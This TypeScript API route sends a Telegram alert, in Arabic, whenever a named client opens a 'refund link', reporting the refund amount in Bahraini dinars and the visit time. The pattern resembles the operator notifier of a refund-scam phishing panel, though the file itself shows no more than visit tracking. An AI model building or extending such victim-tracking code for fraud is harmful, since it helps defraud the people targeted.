import { z } from "zod";
import { auditLog } from "@/lib/audit";
import { fail, ok } from "@/lib/api";
import { getActiveProfile } from "@/lib/profiles";
import { rateLimit } from "@/lib/rate-limit";
import { telegramSend } from "@/lib/telegram";

export const runtime = "nodejs";

const schema = z.object({ profileId: z.string().regex(/^\d{5}$/) });

export async function POST(request: Request) {
  if (!(await rateLimit("notify-visit", request.headers))) return fail("تم تجاوز الحد المسموح.", 429);
  const parsed = schema.safeParse(await request.json().catch(() => null));
  if (!parsed.success) return fail("بيانات غير صالحة.");
  const profile = await getActiveProfile(parsed.data.profileId);
  if (!profile) return fail("الرابط غير متوفر.", 404);
  const text = [
    `🔔 تنبيه: العميل ${profile.name} دخل على رابط الاسترجاع الآن!`,
    `مبلغ الاسترجاع: ${profile.amount.toFixed(3)} BHD`,
    `وقت الدخول: ${new Date().toISOString()}`,
  ].join("\n");
  const sent = await telegramSend(text);
  await auditLog(sent ? "profile.visited" : "profile.visit_failed", "System", {
    profileId: parsed.data.profileId,
  });
  return ok({ ok: sent });
}
